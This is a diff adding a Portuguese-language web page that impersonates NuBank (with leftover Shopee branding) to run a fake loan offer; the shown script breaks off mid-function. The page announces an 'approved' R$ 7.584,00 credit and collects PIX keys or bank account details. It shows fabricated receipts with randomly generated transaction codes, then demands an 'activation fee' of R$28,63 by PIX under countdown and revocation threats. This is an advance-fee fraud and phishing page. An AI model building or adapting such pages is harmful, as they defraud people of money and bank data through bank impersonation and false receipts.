@@ -1,0 +1,1048 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script>
+  window.googlePixelId = "697140fe9f18622627a16193";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="/04/js/pixel-google.js"></script>
+<script src="/04/js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+// Captura e salva UTMs no localStorage pra não perder durante o funil
+(function() {
+    var params = new URLSearchParams(window.location.search);
+    ['utm_source','utm_campaign','utm_medium','utm_content','utm_term'].forEach(function(k){
+        var v = params.get(k);
+        if (v) localStorage.setItem(k, v);
+    });
+})();
+</script>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Pagamento | NuBank</title>
+
+    <!-- CDNs ESSENCIAIS PARA NÃO QUEBRAR NA CLOUDFLARE -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="/04/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- ARQUIVOS ORIGINAIS (mantidos) -->
+    <script src="/04/0tfTC0U9Aair.17"></script>
+    <link rel="stylesheet" href="/04/css/box2ovj3uLa8.css">
+    <link href="/04/css2-3.html" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        shopee: {
+                            light: "#b44aff",
+                            DEFAULT: "#9903d6",
+                            dark: "#7a02ad",
+                        },
+                    },
+                },
+            },
+        };
+    </script>
+
+    <style>
+        body {
+            font-family: "Poppins", sans-serif;
+            background-color: #f6f6f6;
+        }
+
+        .shopee-gradient {
+            background: linear-gradient(135deg, #b44aff 0%, #7a02ad 100%);
+        }
+
+        .card {
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            border-radius: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-shine {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-shine:after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.3) 50%, rgba(255, 255, 255, 0) 100%);
+            transform: rotate(30deg);
+            animation: shine 4s infinite;
+        }
+
+        @keyframes shine {
+            0% { left: -100%; opacity: 0; }
+            10% { left: 100%; opacity: 0.6; }
+            100% { left: 100%; opacity: 0; }
+        }
+
+        .icon-circle {
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+
+        .payment-step {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .payment-step.active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .pulse {
+            animation: pulse-animation 2s infinite;
+        }
+
+        @keyframes pulse-animation {
+            0% { box-shadow: 0 0 0 0 rgba(153, 3, 214, 0.35); }
+            70% { box-shadow: 0 0 0 15px rgba(153, 3, 214, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(153, 3, 214, 0); }
+        }
+
+        .bank-list {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            width: 100%;
+            max-height: 200px;
+            overflow-y: auto;
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 0 0 10px 10px;
+            z-index: 10;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .bank-list.active { display: block; }
+
+        .bank-item {
+            padding: 10px 15px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .bank-item:hover { background-color: #f7fafc; }
+
+        .comprovante {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+        }
+
+        .comprovante-header {
+            background: linear-gradient(135deg, #b44aff 0%, #7a02ad 100%);
+            padding: 20px;
+            text-align: center;
+            color: #ffffff;
+        }
+
+        .comprovante-logo { height: 40px; margin-bottom: 10px; }
+        .comprovante-body { padding: 20px; }
+
+        .comprovante-item {
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+            display: flex;
+            justify-content: space-between;
+        }
+        .comprovante-item:last-child { border-bottom: none; }
+
+        .comprovante-footer {
+            background-color: #f8f8f8;
+            padding: 15px;
+            text-align: center;
+            font-size: 0.9em;
+            color: #666;
+        }
+
+        .comprovante-alert {
+            background-color: #f7e8ff;
+            border-left: 4px solid #FFF07C;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 0.9em;
+            color: #5b3a7a;
+        }
+
+        #emprestimo-progressBar {
+            display: block !important;
+            width: 0%;
+            min-width: 0;
+            max-width: 100%;
+            height: 100%;
+            transition: width 0.5s ease-in-out;
+            position: relative;
+            overflow: hidden;
+            will-change: width;
+            background: linear-gradient(90deg, #b44aff 0%, #9903d6 100%);
+        }
+        
+        /* Estilo para o vídeo local - CLEAN (Sem controles) */
+        #video-local {
+            width: 100%; 
+            height: auto; 
+            display: block; 
+            background: #000; 
+            border-radius: 12px;
+            pointer-events: none;
+        }
+
+        /* Container PIX */
+        #pixContainer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+            background: #f9f9f9;
+            border-radius: 12px;
+        }
+        #pixQrImage {
+            max-width: 280px;
+            margin: 0 auto;
+            display: block;
+        }
+        #pixCopiaCola {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 12px;
+            word-break: break-all;
+            font-family: monospace;
+        }
+        #btnCopiarPix {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background: #9903d6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .hidden { display: none !important; }
+    </style>
+    
+</head>
+
+<body>
+    <div class="max-w-md mx-auto min-h-screen bg-white">
+        <!-- Header -->
+        <div class="flex flex-wrap items-center justify-between p-4 border-b shadow-sm sticky top-0 z-10" style="background-color: white;">
+            <div class="flex items-center">
+                <button id="btnVoltar" class="text-shopee text-2xl mr-3">
+                    <i class="fas fa-arrow-left" style="color:9903d6"></i>
+                </button>
+                <div class="flex items-center">
+                    <img src="/04/images/Va7poSyICCZd.png" alt="Shopee Logo" class="h-8">
+                    <span class="ml-2 text-xl font-bold text-shopee"></span>
+                </div>
+            </div>
+            <div id="userInfoHeader" class="flex flex-col items-end text-sm">
+                <div class="flex items-center font-medium text-white">
+                    <i class="fas fa-user-circle text-white mr-1" style="color:9903d6"></i>
+                    <span style="color:#fff"></span>
+                </div>
+                <div class="text-xs text-gray-500"></div>
+            </div>
+        </div>
+
+        <!-- Área de notificações de provas sociais -->
+        <div id="notificacoesContainer" class="fixed top-16 right-4 z-50 max-w-xs"></div>
+
+        <!-- Conteúdo principal -->
+        <div class="p-5">
+            <!-- Etapa 1 -->
+            <div id="step1" class="payment-step active">
+                <h1 class="text-2xl font-bold text-gray-800 mb-5">Dados para depósito</h1>
+                <div class="bg-blue-50 p-4 rounded-xl mb-6">
+                    <div class="flex items-center">
+                        <div class="bg-blue-100 icon-circle mr-3 flex-shrink-0">
+                            <i class="fas fa-info-circle text-blue-600"></i>
+                        </div>
+                        <p class="text-sm text-blue-800">
+                            Escolha como deseja receber seu crédito. PIX é mais rápido (até 2h úteis), enquanto transferência bancária pode levar até 24h úteis.
+                        </p>
+                    </div>
+                </div>
+
+                <style>.text-white { color: white !important; }</style>
+                
+                <div class="mb-5">
+                    <p class="text-gray-700 font-medium mb-3">Seu crédito aprovado:</p>
+                    <div class="bg-gray-50 rounded-xl p-4 text-center">
+                        <p class="text-3xl font-bold text-shopee" id="approvedAmount">R$ 7.584,00</p>
+                    </div>
+                </div>
+
+                <div class="space-y-4 mb-6">
+                    <p class="text-gray-700 font-medium">Escolha como deseja receber:</p>
+
+                    <div class="border rounded-xl p-4 flex items-center cursor-pointer hover:bg-gray-50" id="pixOption">
+                        <div class="icon-circle bg-shopee-light bg-opacity-10 mr-4">
+                            <i class="fas fa-bolt text-shopee"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-medium text-gray-800">PIX</h3>
+                            <p class="text-xs text-gray-600">Receba em até 2h úteis</p>
+                        </div>
+                        <div class="ml-auto">
+                            <i class="far fa-circle text-gray-300" id="pixCircle"></i>
+                        </div>
+                    </div>
+
+                    <div class="border rounded-xl p-4 flex items-center cursor-pointer hover:bg-gray-50" id="bankOption">
+                        <div class="icon-circle bg-blue-100 mr-4">
+                            <i class="fas fa-university text-blue-600"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-medium text-gray-800">Transferência Bancária</h3>
+                            <p class="text-xs text-gray-600">Receba em até 24h úteis</p>
+                        </div>
+                        <div class="ml-auto">
+                            <i class="far fa-circle text-gray-300" id="bankCircle"></i>
+                        </div>
+                    </div>
+                </div>
+
+                <button id="btnContinue1" class="w-full bg-gray-300 text-white text-lg font-bold py-4 rounded-xl mb-4" disabled="">
+                    Continuar
+                </button>
+            </div>
+
+            <!-- Etapa 2: PIX -->
+            <div id="step2Pix" class="payment-step">
+                <h1 class="text-2xl font-bold text-gray-800 mb-5">Digite sua chave PIX</h1>
+                <div class="bg-blue-50 p-4 rounded-xl mb-6">
+                    <div class="flex items-center">
+                        <div class="bg-blue--100 icon-circle mr-3 flex-shrink-0">
+                            <i class="fas fa-bolt text-blue-600"></i>
+                        </div>
+                        <p class="text-sm text-blue-800">
+                            A chave PIX pode ser seu CPF, telefone, e-mail ou chave aleatória. Verifique seus dados com atenção.
+                        </p>
+                    </div>
+                </div>
+
+                <form id="pixForm" class="space-y-5 mb-6">
+                    <div>
+                        <label for="bankSearch" class="block text-gray-700 font-medium mb-2">Banco:</label>
+                        <div class="relative">
+                            <input type="text" id="bankSearch" placeholder="Digite o nome do seu banco" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
+                            <div id="bankList" class="bank-list"></div>
+                        </div>
+                    </div>
+                    <div>
+                        <label for="pixKey" class="block text-gray-700 font-medium mb-2">Chave PIX:</label>
+                        <input type="text" id="pixKey" placeholder="Digite sua chave PIX" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
+                    </div>
+                    <button id="btnContinuePix" type="submit" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine">
+                        Confirmar
+                    </button>
+                </form>
+            </div>
+
+            <!-- Etapa 2: Banco -->
+            <div id="step2Bank" class="payment-step">
+                <h1 class="text-2xl font-bold text-gray-800 mb-5">Dados bancários</h1>
+                <div class="bg-blue-50 p-4 rounded-xl mb-6">
+                    <div class="flex items-center">
+                        <div class="bg-blue-100 icon-circle mr-3 flex-shrink-0">
+                            <i class="fas fa-info-circle text-blue-600"></i>
+                        </div>
+                        <p class="text-sm text-blue-800">
+                            Certifique-se de que os dados da conta estão corretos para evitar problemas na transferência.
+                        </p>
+                    </div>
+                </div>
+
+                <form id="bankForm" class="space-y-4 mb-6">
+                    <div>
+                        <label for="bankSearchTransfer" class="block text-gray-700 font-medium mb-2">Banco:</label>
+                        <div class="relative">
+                            <input type="text" id="bankSearchTransfer" placeholder="Digite o nome do seu banco" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
+                            <div id="bankListTransfer" class="bank-list"></div>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label for="agencia" class="block text-gray-700 font-medium mb-2">Agência:</label>
+                            <input type="text" id="agencia" placeholder="0000" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
+                        </div>
+                        <div>
+                            <label for="conta" class="block text-gray-700 font-medium mb-2">Conta:</label>
+                            <input type="text" id="conta" placeholder="00000-0" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-gray-700 font-medium mb-2">Tipo de conta:</label>
+                        <div class="grid grid-cols-2 gap-4">
+                            <div class="border rounded-xl p-3 flex items-center cursor-pointer hover:bg-gray-50" id="contaCorrente">
+                                <i class="far fa-circle text-gray-300 mr-2" id="ccCircle"></i>
+                                <span>Conta Corrente</span>
+                            </div>
+                            <div class="border rounded-xl p-3 flex items-center cursor-pointer hover:bg-gray-50" id="contaPoupanca">
+                                <i class="far fa-circle text-gray-300 mr-2" id="cpCircle"></i>
+                                <span>Conta Poupança</span>
+                            </div>
+                        </div>
+                    </div>
+                    <button id="btnContinueBank" type="submit" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine">
+                        Confirmar
+                    </button>
+                </form>
+            </div>
+
+            <!-- Etapa 3: Comprovante PIX -->
+            <div id="step3PixComprovante" class="payment-step">
+                <div class="bg-green-50 p-4 rounded-xl mb-6">
+                    <div class="flex items-center">
+                        <div class="bg-green-100 icon-circle mr-3 flex-shrink-0">
+                            <i class="fas fa-check text-green-600"></i>
+                        </div>
+                        <p class="text-sm text-green-800">
+                            Sua solicitação foi registrada com sucesso! Confira os detalhes abaixo.
+                        </p>
+                    </div>
+                </div>
+                <div class="comprovante mb-6">
+                    <div class="comprovante-header">
+                        <div class="bg-white inline-block p-2 rounded-lg mb-2">
+                            <img src="/04/images/Va7poSyICCZd.png" alt="Shopee Logo" class="h-8">
+                        </div>
+                        <h2 class="text-xl font-bold">Sua solicitação</h2>
+                        <p class="text-sm opacity-80">Confira os detalhes da sua solicitação</p>
+                    </div>
+                    <div class="comprovante-body">
+                        <div class="comprovante-item"><span class="text-gray-600">Valor Aprovado</span><span class="text-gray-800 font-bold text-lg" id="pixValorComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Empresa</span><span class="text-gray-800 font-medium">NuBank S.A.</span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">CNPJ</span><span class="text-gray-800 font-medium">09.694.966/0001-40</span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Data</span><span class="text-gray-800 font-medium" id="pixDataComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Horário</span><span class="text-gray-800 font-medium" id="pixHorarioComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Banco</span><span class="text-gray-800 font-medium" id="pixBancoComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Chave Pix</span><span class="text-gray-800 font-medium" id="pixChaveComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Código da Transação</span><span class="text-gray-800 font-medium" id="pixCodigoComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Autenticação</span><span class="text-gray-800 text-xs break-all" id="pixAutenticacaoComprovante"></span></div>
+                    </div>
+                    <div class="comprovante-alert bg-yellow-50 text-yellow-800">
+                        <i class="fas fa-exclamation-triangle mr-2 text-yellow-800"></i>
+                        Ao prosseguir, você iniciará o processo de saque imediato do seu empréstimo. Caso não conclua a próxima etapa, entenderemos que desistiu do valor.
+                    </div>
+                </div>
+
+                <button id="btnContinuePixComprovante" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine" style="margin-bottom:100px">
+                    Próxima Etapa
+                </button>
+            </div>
+
+            <!-- Etapa 3: Comprovante Banco -->
+            <div id="step3BankComprovante" class="payment-step">
+                <div class="bg-green-50 p-4 rounded-xl mb-6">
+                    <div class="flex items-center">
+                        <div class="bg-green-100 icon-circle mr-3 flex-shrink-0">
+                            <i class="fas fa-check text-green-600"></i>
+                        </div>
+                        <p class="text-sm text-green-800">
+                            Sua solicitação foi registrada com sucesso! Confira os detalhes abaixo.
+                        </p>
+                    </div>
+                </div>
+                <div class="comprovante mb-6">
+                    <div class="comprovante-header">
+                        <div class="bg-white inline-block p-2 rounded-lg mb-2">
+                            <img src="/04/images-3.html" alt="Shopee Logo" class="h-8">
+                        </div>
+                        <h2 class="text-xl font-bold">Sua solicitação</h2>
+                        <p class="text-sm opacity-80">Confira os detalhes da sua solicitação</p>
+                    </div>
+                    <div class="comprovante-body">
+                        <div class="comprovante-item"><span class="text-gray-600">Valor Aprovado</span><span class="text-gray-800 font-bold text-lg" id="bankValorComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Empresa</span><span class="text-gray-800 font-medium">WillBank S.A.</span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">CNPJ</span><span class="text-gray-800 font-medium">09.694.966/0001-40</span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Data</span><span class="text-gray-800 font-medium" id="bankDataComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Horário</span><span class="text-gray-800 font-medium" id="bankHorarioComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Banco</span><span class="text-gray-800 font-medium" id="bankNomeComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Agência</span><span class="text-gray-800 font-medium" id="bankAgenciaComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Conta</span><span class="text-gray-800 font-medium" id="bankContaComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Tipo de Conta</span><span class="text-gray-800 font-medium" id="bankTipoContaComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Código da Transação</span><span class="text-gray-800 font-medium" id="bankCodigoComprovante"></span></div>
+                        <div class="comprovante-item"><span class="text-gray-600">Autenticação</span><span class="text-gray-800 text-xs break-all" id="bankAutenticacaoComprovante"></span></div>
+                    </div>
+                    <div class="comprovante-alert">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+                        Ao prosseguir, você iniciará o processo de saque imediato do seu empréstimo. Caso não conclua a próxima etapa, entenderemos que desistiu do valor.
+                    </div>
+                </div>
+
+                <button id="btnContinueBankComprovante" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine">
+                    Próxima Etapa
+                </button>
+            </div>
+
+            <!-- Etapa 4: Seguro Prestamista com VÍDEO LOCAL -->
+            <div id="step4" class="payment-step">
+                <h1 class="text-2xl font-bold text-gray-800 mb-5">Falta apenas mais um passo</h1>
+
+                <!-- Barra de Progresso -->
+                <div class="bg-white rounded-xl shadow-md p-6 mb-5">
+                    <div class="flex items-center mb-5">
+                        <div class="bg-shopee-light bg-opacity-10 p-3 rounded-full mr-3">
+                            <i class="fas fa-check-circle text-shopee text-xl"></i>
+                        </div>
+                        <div>
+                            <h2 class="text-lg font-bold text-gray-800 mb-1">Quase lá!</h2>
+                            <p class="text-sm text-gray-600">Estamos finalizando a liberação do seu crédito</p>
+                        </div>
+                    </div>
+
+                    <div class="relative mb-4">
+                        <div class="w-full h-4 bg-gray-100 rounded-full overflow-hidden shadow-inner">
+                            <div class="h-full rounded-full shopee-gradient" style="width: 90%; transition: width 1.5s ease-in-out">
+                                <div class="absolute top-0 h-1 w-full bg-white bg-opacity-20"></div>
+                            </div>
+                        </div>
+                        <div class="flex justify-between mt-1 px-1">
+                            <div class="flex flex-col items-center"><div class="bg-shopee h-2 w-2 rounded-full mt-1"></div><span class="text-xs text-gray-500 mt-1">Solicitação</span></div>
+                            <div class="flex flex-col items-center"><div class="bg-shopee h-2 w-2 rounded-full mt-1"></div><span class="text-xs text-gray-500 mt-1">Aprovação</span></div>
+                            <div class="flex flex-col items-center"><div class="bg-shopee h-2 w-2 rounded-full mt-1"></div><span class="text-xs text-gray-500 mt-1">Cadastro</span></div>
+                            <div class="flex flex-col items-center"><div class="bg-gray-300 h-2 w-2 rounded-full mt-1"></div><span class="text-xs text-gray-500 mt-1">Liberação</span></div>
+                        </div>
+                    </div>
+
+                    <div class="flex justify-between items-center text-sm mb-4">
+                        <div class="flex items-center">
+                            <div class="animate-pulse mr-2 h-2 w-2 bg-shopee rounded-full"></div>
+                            <span class="text-gray-600">Processando liberação</span>
+                        </div>
+                        <span class="font-medium text-shopee">90% concluído</span>
+                    </div>
+
+                    <div class="bg-blue-50 p-4 rounded-lg border border-blue border-opacity-10">
+                        <div class="flex items-start">
+                            <i class="fas fa-info-circle text-blue-600 mt-1 mr-3"></i>
+                            <p class="text-sm text-blue-800">
+                                Parabéns! Você está na etapa final. Após completar este último passo, seu empréstimo será liberado diretamente para sua conta.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- BLOCO DO VÍDEO -->
+                <div id="bloco-video" style="display:block; margin:0 auto; width:100%; max-width:820px;">
+                    <video id="video-local" autoplay="" muted="" playsinline="" preload="metadata">
+                        <source src="/04/media/video.mp4" type="video/mp4">
+                        Seu navegador não suporta vídeo HTML5.
+                    </video>
+                </div>
+
+                <div id="seguroPrestamistaInfo">
+                    <p class="text-lg font-medium text-gray-800 mb-4">Benefícios da NuBank:</p>
+
+                    <ul class="space-y-3 mb-5">
+                        <li class="flex items-start">
+                            <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width: 20px; height: 20px; min-width: 20px">
+                                <i class="fas fa-check text-green-600 text-xs"></i>
+                            </div>
+                            <span class="text-gray-700">Menor taxa do mercado 0,81% ao mês</span>
+                        </li>
+                        <li class="flex items-start">
+                            <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width: 20px; height: 20px; min-width: 20px">
+                                <i class="fas fa-check text-green-600 text-xs"></i>
+                            </div>
+                            <span class="text-gray-700">Pode Receber seu empréstimo em até 5 minutos</span>
+                        </li>
+                        <li class="flex items-start">
+                            <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width: 20px; height: 20px; min-width: 20px">
+                                <i class="fas fa-check text-green-600 text-xs"></i>
+                            </div>
+                            <span class="text-gray-700">Primeira parcela só em 90 dias</span>
+                        </li>
+                        <li class="flex items-start">
+                            <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width: 20px; height: 20px; min-width: 20px">
+                                <i class="fas fa-check text-green-600 text-xs"></i>
+                            </div>
+                            <span class="text-gray-700">Sistema mais seguro do Brasil nota 1000 no reclame aqui</span>
+                        </li>
+                    </ul>
+
+                    <div class="mb-6 mt-6 bg-white rounded-lg p-6 shadow-sm border border-gray-100">
+                        <div class="text-center mb-5">
+                            <h2 class="text-xl font-bold text-gray-800 mb-1">Falta apenas mais um passo</h2>
+                            <p class="text-sm text-gray-600">Estamos preparando seu empréstimo...</p>
+                        </div>
+
+                        <div class="w-full bg-gray-100 rounded-full h-3 mb-3">
+                            <div id="emprestimo-progressBar" class="bg-shopee h-3 rounded-full transition-all duration-500" style="width: 0%; display: block"></div>
+                        </div>
+
+                        <div class="flex justify-between items-center text-xs text-gray-500">
+                            <span>Processando</span>
+                            <span id="porcentagem" class="font-medium text-shopee">0% concluído</span>
+                            <span id="contador" class="hidden">03:10</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="liberacaoCard" class="bg-blue-50 rounded-xl p-6 border border-blue-200 shadow-lg hidden" style="margin-top:20px">
+                    <div class="flex items-center justify-center mb-3">
+                        <img src="/04/images/Va7poSyICCZd.png" alt="Shopee Logo" class="h-8 mr-2">
+                        <h2 class="text-xl font-bold text-gray-800">Liberação do Crédito</h2>
+                    </div>
+
+                    <div class="space-y-3 mb-5 bg-white p-4 rounded-lg shadow-sm">
+                        <div class="flex justify-between items-center">
+                            <span class="font-medium text-gray-700">Valor aprovado:</span>
+                            <span class="font-bold text-shopee text-lg" id="valorLiberacaoCard">R$ 7.584,00</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="font-medium text-gray-700">Prazo de transferência:</span>
+                            <span class="text-gray-800">até 48 Horas úteis</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="font-medium text-gray-700">Taxa única de ativação:</span>
+                            <span class="font-semibold text-gray-800">R$28,63</span>
+                        </div>
+                    </div>
+
+                    <p class="text-sm text-gray-600 mb-4 text-center">
+                        Ao concluir a ativação, seu valor será processado automaticamente.
+                    </p>
+
+                    <button id="btnPayInsurance" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl mb-4 transition-all pulse">
+                        LIBERAR MEU VALOR AGORA
+                    </button>
+
+                    <!-- CONTAINER PIX (será exibido quando clicar no botão) -->
+                    <div id="pixContainer" class="hidden">
+                        <h3 style="font-weight:600; margin-bottom:12px; color:#333;">Escaneie o QR Code ou copie o código</h3>
+                        <img id="pixQrImage" src="" alt="QR Code Pix">
+                        <div style="margin-top:16px;">
+                            <label style="display:block; font-size:14px; margin-bottom:6px; color:#555;">Código copia e cola:</label>
+                            <textarea id="pixCopiaCola" readonly="" rows="4"></textarea>
+                            <button id="btnCopiarPix" type="button">
+                                Copiar código
+                            </button>
+                        </div>
+                        <p id="pixStatusMsg" style="margin-top:14px; font-size:14px; color:#555;"></p>
+                    </div>
+
+                    <div class="text-center bg-gray-100 p-3 rounded-lg">
+                        <p class="text-sm font-medium mb-1 text-gray-700">Tempo restante para manter valor reservado:</p>
+                        <p id="timerCountdown" class="text-3xl font-bold text-shopee">04:57</p>
+                        <p class="text-sm text-gray-600">Após o tempo acima, sua aprovação pode ser revogada pelo sistema NuBank</p>
+                    </div>
+                </div>
+
+                <div class="text-center mt-4 text-yellow-600" id="ofertaExpiraContainer">
+                    <i class="fas fa-clock mr-2"></i>
+                    <span class="text-sm font-medium">Oferta expira em 24h</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const barraProgresso = document.getElementById("emprestimo-progressBar");
+            if (barraProgresso) {
+                barraProgresso.style.width = "0%";
+                barraProgresso.style.display = "block";
+                setTimeout(() => { void barraProgresso.offsetWidth; }, 100);
+            }
+
+            const bancos = ["Banco do Brasil", "Itaú", "Bradesco", "Caixa Econômica Federal", "Santander", "Banrisul", "Banco Safra", "Banco Mercantil do Brasil", "Banco Daycoval", "Banco Votorantim (BV)", "Banco Rendimento", "Nubank", "Inter", "C6 Bank", "Next", "Original", "Neon", "Banco Pan", "PagBank", "PicPay", "Digio", "Modalmais", "Sicoob", "Sicredi", "Unicred", "Banco do Nordeste", "Banco da Amazônia", "Banestes", "Banpará", "Banco BRB (Banco de Brasília)", "Banco BMG", "Banco Topázio", "Banco Alfa", "Banco Sofisa", "Banco Toyota", "Banco PSA (Peugeot/Citroën)", "Banco Volkswagen", "Banco Fiat", "Banco CNH Industrial", "BTG Pactual", "XP Investimentos", "Banco Modal", "Banco Pine", "InfinitePay", "Mercado Pago", "Stone Pagamentos", "Dock", "Zippi", "Will Bank", "Creditas", "Credicard", "Banco Caruana", "Banco Original do Agronegócio", "Banco Renault", "Banco Honda", "Banco Yamaha", "Banco Volvo", "Banco Caterpillar", "Banco Ford"];
+
+            const step1 = document.getElementById("step1");
+            const step2Pix = document.getElementById("step2Pix");
+            const step2Bank = document.getElementById("step2Bank");
+            const step3PixComprovante = document.getElementById("step3PixComprovante");
+            const step3BankComprovante = document.getElementById("step3BankComprovante");
+            const step4 = document.getElementById("step4");
+
+            const pixOption = document.getElementById("pixOption");
+            const bankOption = document.getElementById("bankOption");
+            const pixCircle = document.getElementById("pixCircle");
+            const bankCircle = document.getElementById("bankCircle");
+
+            const btnVoltar = document.getElementById("btnVoltar");
+            const btnContinue1 = document.getElementById("btnContinue1");
+
+            const pixForm = document.getElementById("pixForm");
+            const bankSearch = document.getElementById("bankSearch");
+            const bankList = document.getElementById("bankList");
+            const pixKey = document.getElementById("pixKey");
+
+            const bankForm = document.getElementById("bankForm");
+            const bankSearchTransfer = document.getElementById("bankSearchTransfer");
+            const bankListTransfer = document.getElementById("bankListTransfer");
+            const agencia = document.getElementById("agencia");
+            const conta = document.getElementById("conta");
+            const contaCorrente = document.getElementById("contaCorrente");
+            const contaPoupanca = document.getElementById("contaPoupanca");
+            const ccCircle = document.getElementById("ccCircle");
+            const cpCircle = document.getElementById("cpCircle");
+
+            const approvedAmount = document.getElementById("approvedAmount");
+            const storedAmount = localStorage.getItem("creditoAprovado");
+            if (storedAmount) { approvedAmount.textContent = "R$ " + storedAmount; }
+
+            let paymentMethod = "";
+            let accountType = "";
+
+            window.addEventListener("load", () => {
+                const savedPixKey = localStorage.getItem("pixKey");
+                if (savedPixKey) { pixKey.value = savedPixKey; }
+            });
+            pixKey.addEventListener("input", (e) => { localStorage.setItem("pixKey", e.target.value); });
+
+            function generateTransactionCode() {
+                const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+                let code = "";
+                for (let i = 0; i < 10; i++) { code += chars.charAt(Math.floor(Math.random() * chars.length)); }
+                return code;
+            }
+
+            function generateAuthCode() {
+                const chars = "0123456789ABCDEF";
+                let code = "";
+                for (let i = 0; i < 40; i++) {
+                    code += chars.charAt(Math.floor(Math.random() * chars.length));
+                    if ((i + 1) % 2 === 0 && i < 39) code += ".";
+                }
+                return code;
+            }
+
+            function formatDate(date) {
+                return date.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric" });
+            }
+
+            function formatTime(date) {
+                return date.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", timeZone: "America/Sao_Paulo" });
+            }
+
+            function filterBanks(searchTerm) {
+                return bancos.filter((banco) => banco.toLowerCase().includes(searchTerm.toLowerCase()));
